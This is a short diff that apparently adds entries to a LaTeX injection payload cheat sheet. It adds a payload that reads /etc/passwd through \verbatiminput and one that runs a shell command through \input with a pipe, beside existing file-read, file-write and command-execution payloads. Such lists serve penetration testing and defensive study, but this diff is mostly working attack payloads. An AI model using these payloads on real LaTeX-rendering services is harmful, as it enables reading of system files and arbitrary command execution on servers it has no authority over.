@@ -26,6 +26,13 @@ Read multiple lined file
 \closein\file
 ```
 
+Read text file, keep the formatting
+```bash
+\usepackage{verbatim}
+\verbatiminput{/etc/passwd}
+```
+
+
 ## Write file
 ```bash
 \newwrite\outfile
@@ -48,6 +55,7 @@ If you get any LaTex error, consider using base64 to get the result without bad 
 
 ```bash
 \input|ls|base4
+\input{|"/bin/hostname"}
 ```
 
 
